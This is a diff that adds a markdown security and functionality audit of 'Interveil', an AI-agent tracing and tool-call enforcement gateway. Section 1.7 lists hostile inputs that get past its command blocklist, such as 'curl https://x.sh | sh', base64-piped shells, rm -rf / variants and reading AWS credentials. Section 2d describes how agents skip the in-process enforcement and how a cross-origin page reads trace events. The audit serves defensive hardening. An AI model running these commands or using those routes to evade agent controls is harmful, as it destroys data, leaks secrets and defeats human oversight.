@@ -1,0 +1,253 @@
+# Interveil Audit
+
+**Date:** 2026-10-22 · **Branch:** `wip/provider-translation` (commit `2efc642`, which is `main` + your uncommitted work) · **Environment:** Windows 11, Node 24.15, pnpm 11.0.9, Python 3.14. Docker isn't installed on this machine, so I read the Docker setup but couldn't run it.
+
+**How I verified things:**
+- **Ran**: I ran the server or CLI and hit it with curl or a script.
+- **Tested**: unit tests, or a probe script that calls the built `dist/` modules directly.
+- **Read**: I read the code but didn't run it.
+
+The probe and benchmark scripts are in the session scratchpad, not the repo. Phase 2 should commit a cleaned-up benchmark.
+
+---
+
+## Step 0: Uncommitted work
+
+**What it is** (now committed as `2efc642` on `wip/provider-translation`; `main` is untouched):
+
+| File | Change |
+|---|---|
+| `interveil/package.json`, `pnpm-lock.yaml` | Adds `vitest@^1.0.0` (resolved to **1.0.0**, Dec 2023) and a `test` script |
+| `interveil/src/gateway/llm-proxy.ts` | Gemini `stream: true` now returns **400** instead of silently replying with non-streaming JSON. `/v1/proxy/embeddings` now returns **501** instead of a fake empty `200`. Both changes make the gateway more honest. |
+| `src/commands/blocklist.test.ts` | 8 tests: `extractStrings` and `checkCommand` |
+| `src/gateway/providers/translation.test.ts` | 4 tests: OpenAI↔Anthropic and OpenAI↔Gemini request/response translation |
+| `src/policy/engine.test.ts` | 3 tests: allow, conditions, halt (fs and yaml are mocked) |
+
+**Status:** `tsc` is clean, `server` and `ui` build, and **15/15 tests pass** (ran).
+
+**Is it complete?** No. The branch name says "provider translation", but no translation work exists yet. What's half-finished:
+- You mentioned a `providers/translation/` directory. It doesn't exist; the work is a single file, `providers/translation.test.ts`. You also didn't mention `src/policy/engine.test.ts`, but it was part of the change.
+- **Gemini streaming** isn't implemented; it now returns an error. **Anthropic streaming** forwards Anthropic's raw SSE format to OpenAI-format clients without translating it (read).
+- `vitest@1.0.0` has **critical advisories** (RCE when the UI or API server is running; the tinypool dependency). It's a dev dependency, but it fails any audit. Bump to vitest 3.
+- `"caps depth"` in `blocklist.test.ts` **locks a security bypass into the test suite**: a payload nested 9 or more levels deep is not scanned (see §1.7).
+- The policy tests mock `fs` and `yaml`, so real YAML parsing, invalid files, and the fail-open path are never exercised.
+- Test files compile into `dist/` (`dist/policy/engine.test.js`, …) and would be published, because `tsconfig.json` includes `src/**/*.ts`.
+- The embeddings route still writes a trace event before returning 501. With SQLite (`foreign_keys = ON`), that event can reference a session that doesn't exist (read).
+
+---
+
+## 1. Claims vs reality
+
+### Summary
+
+| # | Claim | Verdict |
+|---|---|---|
+| 1 | Real-time tracing of reasoning, tool calls, and LLM requests over WebSockets | **Works** (with caveats) |
+| 2 | Unified LLM gateway across OpenAI, Anthropic, and Gemini with SSE streaming | **Partial**: only OpenAI non-streaming is solid |
+| 3 | Full MCP tool-call logging | **Partial**: plain JSON-over-HTTP only, no enforcement |
+| 4 | Policy-as-code in YAML (block, audit, halt, per-agent deny, conditions, schema validation) | **Partial**: in-process TS SDK only, fails open |
+| 5 | Webhook alerts on policy violations | **Missing** |
+| 6 | Per-IP API rate limiting | **Works** |
+| 7 | Pre-execution command blocklist | **Partial**: runs before execution, but trivially bypassed and has false positives |
+
+### 1.1 Real-time tracing over WebSockets: **Works**
+- `src/api/events.ts` validates events with Zod, stores them, and broadcasts them through `src/ws/broadcaster.ts`. The React UI (`src/ui/src/hooks/useWebSocket.ts`) shows them live.
+- **Ran:** the Python example (`examples/python/basic_agent.py`) produced two sessions. The UI rendered the timeline, including the red `BLOCKED` step.
+- Caveats:
+  - Step types for wrapped agents are **guessed from method names** (`sdk/trace.ts:34`). For example, `search()` shows up as `CUSTOM`, not a tool call.
+  - `POLICY_VIOLATION` and `POLICY_AUDIT` events are only broadcast, never stored (`policy/engine.ts:118,146`). They vanish on refresh, they always use `step_index: 0`, and they get a random session ID when none is passed.
+  - The UI once showed "0 steps" for a session that had 5 events, until I reloaded the page (ran; intermittent race in `useSessions.ts`).
+
+### 1.2 Unified LLM gateway with SSE streaming: **Partial**
+
+Each path below is in `src/gateway/llm-proxy.ts` and `streaming.ts`.
+
+| Path | Status | Evidence |
+|---|---|---|
+| OpenAI, non-streaming | Works | Ran against a local mock provider, 500 requests |
+| OpenAI, streaming | **Broken** | Ran. Chunks are forwarded, but **the gateway never ends the response**: `streaming.ts` has no `clientRes.end()`. **0/10 streams were closed by the gateway** vs 10/10 when calling the mock directly. Clients that read until the connection closes (curl, anything iterating to EOF) hang forever. Each stream also logs `LLM_RESPONSE` **twice** (100 response events for 50 streams), because `onDone` fires on both upstream `end` and client `close`. |
+| Anthropic, non-streaming | Partial | Read and unit tested. Text only: OpenAI `tools` are passed through untranslated (Anthropic rejects that schema), `tool` and `tool_calls` messages are turned into plain assistant text, and tool-use blocks in responses are dropped. Any tool-calling agent breaks. |
+| Anthropic, streaming | **Broken** | Read. Anthropic's raw SSE events (`message_start`, `content_block_delta`, …) are sent to an OpenAI-format client untranslated. The trace's assembled text is always empty because it parses `choices[0].delta`. |
+| Gemini, non-streaming | Partial | Read and unit tested. Text only, the **system prompt is silently dropped**, and the API key goes in the URL query string (`gemini.ts:41`). |
+| Gemini, streaming | Missing | Returns 400 (your WIP change) |
+| Embeddings | Missing | Returns 501 |
+
+Other gateway gaps:
+- **Upstream URLs are hard-coded** (`OPENAI_BASE`, `ANTHROPIC_BASE`), so there's no Azure, OpenRouter, Ollama, or local-mock support.
+- Upstream requests have **no timeout**.
+- Provider detection uses model-name prefixes. Unknown models go to OpenAI.
+- **The gateway does no enforcement.** It never calls the policy engine or the blocklist on prompts or on the `tool_calls` it returns.
+
+### 1.3 Full MCP tool-call logging: **Partial**
+`src/gateway/mcp-proxy.ts` POSTs the JSON-RPC body to a single configured URL and logs `TOOL_CALL` and `TOOL_RESULT`. That works only for an MCP server that answers plain JSON over HTTP:
+- It forwards only `Content-Type`, not `Accept: application/json, text/event-stream` or `Mcp-Session-Id`. A spec-compliant Streamable HTTP server will refuse the request or return SSE, and the proxy then wraps the SSE in `{"raw": ...}`, which breaks the protocol.
+- It has no stdio support, which is how most MCP servers run.
+- Every non-`tools/call` method (`initialize`, `tools/list`, …) is logged as tool `"unknown"`.
+- Without an `x-interveil-session-id` header, each call becomes its own session.
+- It does **no policy or blocklist check**, so it's logging, not governance.
+- Ran: with no server configured it returns 503 with a clear message. I couldn't run it end to end because there's no MCP server example in the repo.
+
+### 1.4 Policy-as-code in YAML: **Partial**
+
+The main gap is **where the policy engine actually runs**. `evaluatePolicy` has exactly one caller: the in-process TypeScript `trace()` wrapper (`sdk/trace.ts:178`).
+- `interveil serve --policy-file x.yaml` loads the file into the server, and **then nothing ever evaluates it**: no HTTP route, gateway, or MCP path calls it (grep).
+- The Python SDK has no policy support.
+
+| Sub-claim | Verdict | Evidence |
+|---|---|---|
+| `block` | Works (TS `trace()` only) | Tested |
+| `audit` (`allow_and_audit`) | Partial | Broadcast but not persisted (`engine.ts:135`) |
+| `halt` (`halt_agent`) | Partial | Throws only when `environments.<env>.haltOnCritical` is set **and** the rule's severity is `critical`. Otherwise it behaves exactly like `block`. Nothing halts the agent beyond throwing in-process. |
+| `require_approval` | Partial | Throws. No approval flow exists. |
+| Per-agent deny rules | Partial | Exact agent-ID match only. **An agent missing from the file is allowed everything** (tested). There's no `*` or default policy. |
+| Input-condition triggers | Partial | Only `equals`, `greaterThan`, `lessThan`, and exact match on dotted paths. No regex, contains, in, or not. Arguments are wrapped as `{args}`, so paths look like `args.0.amount` (undocumented). |
+| Schema validation | **Missing** | `validatePolicyFile` checks only `version`, `agents[].id`, and `rules`, and the loader never calls it. Tested: `action: deny` (a typo) is reported **`valid: true`**. At runtime it falls through as `action=deny`, which `trace()` treats as **allow**. |
+| Fail-closed | **No, it fails open** | Tested: malformed YAML → `allow`. Missing file → `allow`. `loadPolicyFile` logs a warning and carries on (`engine.ts:56`). |
+
+The tool registry (`src/tools/registry.ts`) is a second, separate access-control system: per-tool allow/deny plus Zod input schemas. It works the same way (in-process, and an unknown agent is allowed). Having two policy systems with different syntax will confuse a reviewer.
+
+### 1.5 Webhook alerts on policy violations: **Missing**
+Webhooks exist only in `interceptChildProcess` (`src/commands/interceptor.ts:26`), and only for command-blocklist hits on `safeSpawn`. They're opt-in through code, fire-and-forget, and have no timeout, retries, or signing. The YAML policy engine, the `trace()` wrapper, and the gateway never send webhooks.
+
+### 1.6 Per-IP API rate limiting: **Works**
+`server.ts:39-57` uses express-rate-limit: 1000/min on `/api/`, 120/min on `/v1/`.
+- **Ran:** 130 rapid requests to `/v1/proxy/models` returned 120×200 then 10×429. A spoofed `X-Forwarded-For` was correctly ignored.
+- Caveats:
+  - The intended health-check exemption is broken: the skip checks `req.path === '/api/v1/health'`, but inside the `/api/` mount the path is `/v1/health`. Health responses carry `RateLimit-Remaining`, so they're being counted (ran).
+  - Counts live in memory per process.
+  - Behind a reverse proxy, every client would share one IP, because `trust proxy` isn't configurable.
+  - 120/min is low for an agent fleet routed through a single proxy.
+
+### 1.7 Pre-execution command blocklist: **Partial**
+It does run **before** execution in TS `trace()`, Python `trace()`, and `interceptChildProcess`. But it's a lowercase **substring** match against `config/blocklist.json` (`src/commands/blocklist.ts:102`). Tested against the built code:
+
+**Bypasses.** 11 of 15 dangerous inputs were **allowed**:
+- `rm  -rf /` (double space), `rm -fr /`, `rm\t-rf /`, `r''m -rf /`
+- `find / -delete`, `python -c "shutil.rmtree('/')"`, `echo … | base64 -d | sh`
+- `curl https://x.sh | sh`, `curl -s https://x.sh | bash`
+- `DROP  TABLE users`, `cat ~/.aws/credentials`, `mkfs.ext4 /dev/sda1`
+
+**Whitelist bypass:**
+- Whitelisting `rm -rf /tmp` lets `rm -rf /tmp && rm -rf /` through.
+- In `checkCommand(value)`, the first whitelisted string returns immediately, so `["ls", "rm -rf /"]` with `ls` whitelisted is allowed.
+
+**Depth bypass:** a payload nested more than 8 levels deep isn't scanned at all, which fails open.
+
+**False positives.** 4 of 4 benign strings were **blocked**: "Please *format* the answer…", "*Truncate* the summary…", `git log --format=%H`, "the fo*rm -r* flag".
+
+**Demo impact (ran):** `examples/typescript/basic-agent.ts` **blocks itself on every run**. Its own search results contain "in**format**ion", which matches `FORMAT`, so `analyze()` throws `PolicyViolationError`. The flagship TypeScript demo fails for the wrong reason.
+
+### README and landing-page promises the code doesn't keep
+
+| Promise | Where | Reality |
+|---|---|---|
+| `npm install -g interveil` / `npm install interveil` | `interveil/README.md` | Not published: npm returns 404 (ran) |
+| `pnpm install && pnpm run build` quickstart | root `README.md` | **Fails on pnpm 11** (ran): `ERR_PNPM_IGNORED_BUILDS`, because `pnpm-workspace.yaml` still contains the placeholder `allowBuilds: 'set this to true or false'`. `better-sqlite3` never builds. |
+| `docker-compose up` works | `interveil/README.md` | Read, couldn't run: the `Dockerfile` runs `npm install --production` and then `npm run build`, which needs `tsc` and `vite` (dev dependencies) **and** `pnpm` (not in `node:24-alpine`). There's no `.dockerignore`, so host `node_modules` (Windows native binaries) get copied in. |
+| `trace(agent, { blockedPatterns: [...] })` | `interveil/README.md` | **That option doesn't exist.** Tested: `TS2353 'blockedPatterns' does not exist in type 'TraceOptions'`. The real option is `commandConfig.block`. |
+| `interveil serve` = in-memory store | `interveil/README.md` | The CLI defaults to SQLite at `~/.interveil/traces.db`. When SQLite can't load, it falls back to memory but **still prints "Persistent storage: …"** (ran), and it recommends the long-deprecated `windows-build-tools`. |
+| `--policy-file` "Load YAML policy rules at startup" | both READMEs | Loaded, then never evaluated (§1.4) |
+| "Phase 1.5: LLM Gateway (multi-provider proxy, streaming) ✅" | root `README.md` | §1.2 |
+| "Interveil … returns the response unchanged" | `interveil/README.md` | OpenAI streams never close; Anthropic and Gemini responses are rewritten and lossy |
+| Cursor, Continue, Cline via base URL | both READMEs, UI | Not tested. I *believe* Cursor routes custom-base-URL calls through its own servers, which can't reach `localhost`. Verify before claiming it. |
+| OpenAI Agents SDK integration | `src/integrations/openai-agents.ts` | **Doesn't match the real SDK API**: `@openai/agents` uses `run(agent, input)`, and agents have no `.run()`. It logs start and end only. |
+| "Every agent decision is logged **immutably**, meeting **SOC 2 and HIPAA** requirements" | `index.html` (public site) | **False and risky.** The write API is unauthenticated, nothing is append-only, and the default store can be in-memory. Remove it. |
+| "PostgreSQL (Enterprise)" storage layer | `index.html` | Doesn't exist |
+| "Webhook alerts", "rate limiting enforced at the infrastructure level" for tool access | `index.html` | §1.5. Rate limits are per-IP HTTP limits, not per tool. |
+| "Sidecar anomaly detection ✅", "team collaboration with trace comments ✅" | `index.html` | `SidecarMonitor.observe()` is never called anywhere (dead code). Comments live in memory, have an API but no UI, and are unauthenticated. |
+| "MIT" license | both READMEs | **There's no LICENSE file** |
+
+---
+
+## 2. Scorecard
+
+| | Area | Score | Reason |
+|---|---|:-:|---|
+| a | First run | **1/5** | `pnpm install` exits 1 on pnpm 11, so the documented build fails. Docker can't build. No `.env.example`, no `packageManager` pin, and the npm package doesn't exist. One good sign: a missing provider key gives a clear 401 message. |
+| b | Demo | **2/5** | The UI looks good and the Python example shows a live block. But the TS example blocks itself on a false positive, there's no scripted *policy* (YAML) block scenario, no demo that runs without API keys, and no GIF or video in the README. |
+| c | Integration effort | **3/5** | Observing is cheap: **1 line** (swap `base_url`) for OpenAI-compatible clients, or **2-3 lines** for `trace(agent)`. But base_url mode gets **no enforcement** and streaming hangs. The LangChain and Anthropic-SDK integrations observe only, the OpenAI Agents wrapper is wrong, and there are no examples for the OpenAI Agents SDK, Claude Agent SDK, LangGraph, or an MCP server. |
+| d | Security | **1/5** | Details below. This is the score that sinks a governance product. |
+| e | Tests and CI | **1/5** | 15 unit tests (blocklist 8, translation 4, policy 3), all using mocks. No HTTP-route or streaming tests (the stream-never-closes bug would have been caught). No CI, no badge, no lint. |
+| f | Code quality | **3/5** | Strict TypeScript, small readable modules, Zod at the API edge, a clean store interface. Against that: three copies of the `emitEvent` helper; step index is computed as `getEvents().length` (O(n) per request); module-level globals; `console.*` instead of a logger; swallowed errors; dead code (sidecar, comments, orchestration graph, two policy systems); and **~170 tracked Replit-template files** (`artifacts/`, `lib/`, `scripts/`) unrelated to Interveil. |
+| g | Performance | **3/5** | Measured against a local mock provider, in-memory store, sequential: **+0.77 ms p50 / +1.49 ms p95** added per non-streaming request (n=500; direct 1.58/2.18 ms vs gateway 2.35/3.04 ms). Streaming adds ~1.4 ms to time-to-first-byte (TTFB). **50 concurrent streams: 50/50 delivered all chunks.** No slowdown at 500 events in one session. Docked for: streams never closing, duplicate response events, no upstream timeout, and an unbounded in-memory store. |
+| h | README and docs | **2/5** | The one-sentence pitch is decent and the API table is useful. But the two READMEs contradict each other, there's no architecture diagram or policy examples, it contains false claims (above), and there's no limitations section. |
+| i | Positioning | n/a | See below |
+
+### 2d. Security detail
+- **Fails open everywhere:**
+  - A malformed, missing, or typo'd policy allows everything (tested).
+  - An agent that isn't listed is allowed (tested).
+  - Blocklist depth over 8 is allowed (tested).
+  - If the Interveil server is down, `trace()` still runs the agent; only the trace is lost. That's fine for tracing, but call it out for enforcement.
+- **Agents can bypass enforcement trivially.** It runs in-process inside the agent's own wrapper, so calling the unwrapped object, spawning a process directly, or talking to the provider without the proxy skips it all. The gateway enforces nothing.
+- **No authentication in practice:**
+  - With `AUTH_ENABLED=true`, `GET /api/v1/sessions` and `POST /api/v1/events` still work without a token (ran). `requireAuth` is exported but never mounted.
+  - **Anyone can register as `admin`** anonymously (ran).
+  - Only the WebSocket checks tokens. Users and tokens live in memory.
+- **Cross-site exposure:**
+  - CORS defaults to `*`, and the server listens on all interfaces (read: `server.listen(port)` with no host).
+  - Any web page the developer visits can read every stored prompt through `fetch`. Ran: a WebSocket connection with `Origin: https://evil.example` received live trace events, because there's no origin check.
+  - In stored-key mode (`OPENAI_API_KEY` set on the server), anyone who can reach the port, including a page in the developer's browser, can **spend the server's API keys**. The gateway requires no client credential.
+- **Secrets:** passthrough keys aren't logged (good). The Gemini key goes in the URL query. Prompts and responses are stored in plaintext with no redaction option.
+- **Injection:**
+  - Policy conditions use plain comparisons, with no `eval` or regex, so there's no code-injection risk. The tool registry's `mustMatch` builds a `RegExp` from config (ReDoS risk only if the policy author is untrusted).
+  - Command matching is substring-only, so shell metacharacters, quoting, and chaining defeat it (§1.7).
+  - The UI's JSON viewer escapes `& < >` before `dangerouslySetInnerHTML` (OK).
+- **Dependency audit (`pnpm audit`, ran):**
+  - Whole workspace: **16 critical, 52 high, 40 moderate, 12 low**.
+  - Most come from the unrelated Replit packages: `lib/api-spec` (orval: 11 critical) and `artifacts/*`.
+  - `interveil` itself: 5 critical / 11 high, all dev or transitive (vitest 1.0.0, tinypool, vite 5, postcss, nanoid), plus prod: `ws` (high, DoS), `proxy-addr` (critical, only relevant with a trust-proxy subnet), `qs`, `uuid`, `yaml`, `body-parser`.
+  - Deleting the template packages and bumping vitest, vite, ws, and express clears nearly all of it.
+
+### 2i. Positioning (honest)
+- **Langfuse / LangSmith:** SDK-based tracing, evals, prompt management, datasets. Far deeper observability than Interveil, and neither blocks anything. Interveil shouldn't compete on observability.
+- **Helicone:** a proxy-based observability gateway (base-URL swap, caching, cost tracking). The architecture is the same as Interveil's gateway, and Helicone is much more mature. Search results didn't show it blocking tool calls.
+- **Portkey (now Palo Alto Networks) / LiteLLM:** gateways with guardrail hooks that can reject requests or responses. Their guardrails are mostly content-oriented (PII, jailbreak, schema), not "this agent may not call `delete_user` with amount > 100".
+- **Guardrail libraries (NeMo Guardrails, Guardrails AI, Llama Guard):** validate LLM *inputs and outputs* in-process. They're not tool-call authorization and not a central gateway.
+- **MCP gateways (Enkrypt AI MCP Gateway, McpVanguard, Akto, Bifrost, …):** this is where "enforcement on tool calls" now lives in 2026, and several are open source. **Interveil isn't unique here**, and its MCP proxy is far behind them.
+
+**What Interveil can honestly claim:**
+- It puts tracing **and pre-execution enforcement** (per-agent YAML rules on tool name and arguments, plus a command blocklist) in one small, readable, self-hosted codebase with a live UI.
+- That's a strong *portfolio* story for an FDE or SE role, as in "I built the enforcement layer and can explain its threat model". It's a weak *product* story.
+
+**Recommended pitch:** *"A self-hosted gateway that traces agent runs and blocks disallowed tool calls before they execute, with policies in YAML."* That's only true once Phase 2 P1 #9 (gateway-side enforcement) lands. Today, enforcement is in-process only.
+
+Sources for 2i: [Dupple: Best LLM Gateways 2026](https://dupple.com/learn/best-llm-gateways), [Maxim: AI gateways for guardrails](https://www.getmaxim.ai/articles/top-5-ai-gateways-for-implementing-guardrails-in-ai-applications.md), [Maxim: Best MCP gateways 2026](https://www.getmaxim.ai/articles/best-mcp-gateways-in-2026-compared-by-deployment-model-and-governance-depth/), [Enkrypt AI MCP Gateway](https://www.enkryptai.com/product/mcp-gateway), [McpVanguard](https://mcpservers.org/servers/provnai/mcpvanguard), [Akto MCP gateway](https://www.akto.io/blog/mcp-gateway). Several of these are vendor-authored; I used them only for what each product category does.
+
+---
+
+## 3. Prioritized plan
+
+Ordered by impact on a hiring manager per hour. **P0** = embarrassing if found, **P1** = makes it impressive, **P2** = nice to have. Every engine or gateway fix ships with tests.
+
+| # | Tag | Fix | Est. |
+|---|---|---|---|
+| 1 | P0 | **Delete the Replit template leftovers**: `artifacts/`, `lib/`, `scripts/`, tracked `attached_assets/*.pdf`, and the matching `pnpm-workspace.yaml` entries and catalog. This removes ~170 unrelated files and most audit findings. | 0.5h |
+| 2 | P0 | **Make first run work**: fix the `allowBuilds` placeholders (build `better-sqlite3`, skip `keytar` and `vsce-sign`), pin `packageManager`, add `.env.example`, make the SQLite fallback message truthful, add a LICENSE file. | 1h |
+| 3 | P0 | **Fix streaming**: end the client response, call `onDone` once, buffer SSE lines that split across chunks, add an upstream timeout. Add route tests against a mock upstream (stream completes; one response event). | 1.5h |
+| 4 | P0 | **Make the policy engine fail closed**: a Zod schema for the policy file; invalid file or unknown action means `serve` refuses to start and `trace()` throws; a default `*` agent; `deny`-by-default option; persist `POLICY_*` events. Tests for every fail-open path found above. | 2.5h |
+| 5 | P0 | **Rebuild the blocklist matcher**: normalize whitespace and quotes; word-boundary regex rules instead of bare `FORMAT`/`TRUNCATE`; whitelist must match the *whole* command and never short-circuits other arguments; no depth fail-open (iterative scan, or block when over the limit). Add a bypass and false-positive corpus as tests. This also fixes the TS demo. | 3h |
+| 6 | P0 | **Lock down the server**: bind `127.0.0.1` by default; CORS defaults to same-origin; WebSocket origin check; one `INTERVEIL_API_KEY` bearer token enforced on `/api`, `/v1`, and `/ws` when set; remove open registration; stored-key mode requires the client token. Tests. | 3h |
+| 7 | P0 | **Remove false claims** from both READMEs and `index.html` (SOC 2/HIPAA/immutable, PostgreSQL, webhooks, `npm install`, `blockedPatterns`, sidecar, comments). Merge into one README. | 1h |
+| 8 | P0 | **Fix Docker**: multi-stage build with dev dependencies and pnpm via corepack, `.dockerignore`, so `docker compose up` works with zero config. I can't run Docker here, so I'll verify in CI. | 1.5h |
+| 9 | P1 | **Enforce at the gateway**: run policy and blocklist on `tool_calls` in LLM responses (non-streaming, and streaming once assembled) and on MCP `tools/call`. On violation, return a structured refusal plus a persisted `POLICY_VIOLATION`. This makes "governance gateway" true for base-URL users and is the demo's centerpiece. | 6h |
+| 10 | P1 | **Configurable upstream base URLs** (`OPENAI_BASE_URL`, etc.). Needed by #11 and #13; also enables Ollama, Azure, and OpenRouter. | 1h |
+| 11 | P1 | **Scripted, keyless demo** (`pnpm demo`): a mock LLM that tries a dangerous tool call gets blocked live by a YAML rule, then a webhook fires. Record a GIF for the README. | 3h |
+| 12 | P1 | **CI**: GitHub Actions running typecheck, test, build, and Docker build, plus a coverage report and badge. Add ESLint. | 2h |
+| 13 | P1 | **Commit the benchmark** (`pnpm bench`, mock upstream, p50/p95, concurrent streams) and put real numbers in the README. | 1h |
+| 14 | P1 | **Webhooks on policy violations**: configured in policy YAML; timeout, retry once, HMAC signature. Tests. | 2h |
+| 15 | P1 | **Two real integration examples**: (a) the OpenAI Agents SDK (Python) through `base_url`, blocked by policy; (b) an MCP server behind `/v1/mcp`. Delete the fake `openai-agents.ts` wrapper. | 4h |
+| 16 | P1 | **README rewrite**: pitch, Mermaid architecture diagram, 3-command quickstart, policy examples, threat model and **Limitations** section. | 2h |
+| 17 | P1 | **Dependency bumps** (vitest 3, vite, ws, express 4.21, uuid, yaml) to a clean `pnpm audit --prod`. Exclude tests from `dist`. | 1h |
+| 18 | P2 | Anthropic tool-use translation, plus streaming translation | 4h |
+| 19 | P2 | Gemini streaming and `systemInstruction` support; move the key to the `x-goog-api-key` header | 2.5h |
+| 20 | P2 | MCP Streamable HTTP: forward `Accept` and `Mcp-Session-Id`, pass SSE through | 2h |
+| 21 | P2 | Delete or clearly label experimental code: sidecar, comments, orchestration graph. Merge the tool-registry ACL into the YAML policy engine. | 2h |
+| 22 | P2 | Python SDK policy parity: evaluate via a server endpoint `POST /api/v1/policy/evaluate`, which also enables a Claude Agent SDK `PreToolUse` hook example | 3h |
+| 23 | P2 | Small fixes: health rate-limit exemption, `trust proxy` option, cap the in-memory store, step-index counter, UI session race, add a logger with levels | 2h |
+
+**Totals:** P0 ≈ 14h · P1 ≈ 22h · P2 ≈ 15.5h.
+
+If time is short, stop after P0 + #9–#13 (≈ 27h). That gets you a working one-command setup, a keyless demo with a live block, CI with a badge, and real latency numbers.
+
+**Resume numbers available after Phase 2** (from the benchmark and CI, not invented): setup time from a fresh clone, added latency p50/p95, number of tests, number of working integrations.
